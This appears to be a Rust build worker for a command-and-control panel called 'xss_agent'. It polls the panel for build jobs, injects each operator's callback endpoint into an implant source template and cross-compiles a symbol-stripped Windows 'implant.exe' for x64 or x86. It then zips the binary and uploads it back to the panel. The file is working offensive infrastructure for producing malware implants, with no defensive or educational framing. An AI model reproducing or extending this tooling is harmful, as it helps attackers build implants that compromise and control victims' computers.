use serde::{Deserialize, Serialize};
use std::error::Error;
use std::fs;
use std::io::{Read, Write};
use std::path::Path;
use std::process::Command;
use tokio::time::Duration;
use zip::write::FileOptions;
use zip::ZipWriter;
use reqwest::Client;
use reqwest::multipart::{Form, Part};

#[derive(Debug, Serialize, Deserialize)]
struct Builder {
    id: i32,
    builder_id: String,
    endpoint_url: String,
    arc: String,
    implant: Option<String>,
}

async fn fetch_builder() -> Result<Builder, Box<dyn Error>> {
    let url = "http://webserver/panel/xss_agent/builder/get_builder.php";
    let response = reqwest::get(url).await?;

    if !response.status().is_success() {
        return Err(format!("Error making request: {}", response.status()).into());
    }

    let json_body: serde_json::Value = response.json().await?;

    if json_body["status"] == "success" {
        let builder: Builder = serde_json::from_value(json_body["data"].clone())?;
        Ok(builder)
    } else {
        Err(format!("{}", json_body["message"]).into())
    }
}

fn create_zip_file(binary_path: &str, builder_id: &str, architecture: &str) -> Result<String, Box<dyn Error>> {
    let zip_file_path = format!("/implant/implant/payload/implant_{}_{}.zip", builder_id, architecture);
    let file = std::fs::File::create(&zip_file_path)?;
    let mut zip = ZipWriter::new(file);
    let options: FileOptions<'_, ()> = FileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated)
        .unix_permissions(0o755);

    zip.start_file("implant.exe", options)?;
    let mut f = std::fs::File::open(binary_path)?;
    let mut buffer = Vec::new();
    f.read_to_end(&mut buffer)?;
    zip.write_all(&buffer)?;
    zip.finish()?;

    println!("ZIP file created successfully: {}", zip_file_path);
    Ok(zip_file_path)
}

async fn send_implant(builder_id: &str, zip_file_path: &str) -> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let file_content = std::fs::read(zip_file_path)?;
    let file_name = zip_file_path.to_string(); // Create an owned String
    let part = Part::bytes(file_content)
        .file_name(file_name)  // Use the String here
        .mime_str("application/zip")?;
    let form = Form::new()
        .part("zip_file", part)
        .text("builder_id", builder_id.to_string());

    let response = client.post("http://webserver/panel/xss_agent/builder/send_implant.php")
        .multipart(form)
        .send()
        .await?;

    if response.status().is_success() {
        println!("Implant uploaded successfully");
    } else {
        println!("Implant upload failed: {}", response.status());
    }

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    loop {
        match fetch_builder().await {
            Ok(builder) => {
                println!("ID: {}", builder.id);
                println!("Builder ID: {}", builder.builder_id);
                println!("Endpoint URL: {}", builder.endpoint_url);
                println!("Architecture: {}", builder.arc);

                // Copy the main_base.rs file to main.rs and replace {{endpoint}} with builder.endpoint_url
                let main_base_path = Path::new("/implant/implant/src/main_base.rs");
                let main_path = Path::new("/implant/implant/src/main.rs");
                let main_base_content = fs::read_to_string(main_base_path)?;
                let main_content = main_base_content.replace("{{endpoint}}", &builder.endpoint_url);
                fs::write(main_path, main_content)?;

                // Compile the main.rs file based on the architecture
                if builder.arc.contains("x64") {
                    let implant_compile_command = Command::new("cargo")
                        .args(&[
                            "rustc",
                            "--manifest-path",
                            "/implant/implant/Cargo.toml",
                            "--target",
                            "x86_64-pc-windows-gnu",
                            "--release",
                            "--",
                            "-Cdebuginfo=0",
                            "-Cstrip=symbols",
                            "-Cpanic=abort",
                            "-Copt-level=3",
                        ])
                        .output()?;
                    if implant_compile_command.status.success() {
                        println!("x86_64 compilation successful");
                        let zip_file_path = create_zip_file("/implant/implant/target/x86_64-pc-windows-gnu/release/implant.exe", &builder.builder_id, "x86_64")?;
                        send_implant(&builder.builder_id, &zip_file_path).await?;
                    } else {
                        println!("x86_64 compilation failed: {}", String::from_utf8_lossy(&implant_compile_command.stderr));
                    }
                } else if builder.arc.contains("x86") {
                    let implant_compile_command = Command::new("cargo")
                        .args(&[
                            "rustc",
                            "--manifest-path",
                            "/implant/implant/Cargo.toml",
                            "--target",
                            "i686-pc-windows-gnu",
                            "--release",
                            "--",
                            "-Cdebuginfo=0",
                            "-Cstrip=symbols",
                            "-Cpanic=abort",
                            "-Copt-level=3",
                        ])
                        .output()?;
                    if implant_compile_command.status.success() {
                        println!("x86 compilation successful");
                        let zip_file_path = create_zip_file("/implant/implant/target/i686-pc-windows-gnu/release/implant.exe", &builder.builder_id, "i686")?;
                        send_implant(&builder.builder_id, &zip_file_path).await?;
                    } else {
                        println!("x86 compilation failed: {}", String::from_utf8_lossy(&implant_compile_command.stderr));
                    }
                }

                // Sleep for a while before making the next request
                tokio::time::sleep(Duration::from_secs(5)).await;
            }

            Err(err) => {
                println!("{}", err);
                tokio::time::sleep(Duration::from_secs(1)).await;
            }
        }
    }
}
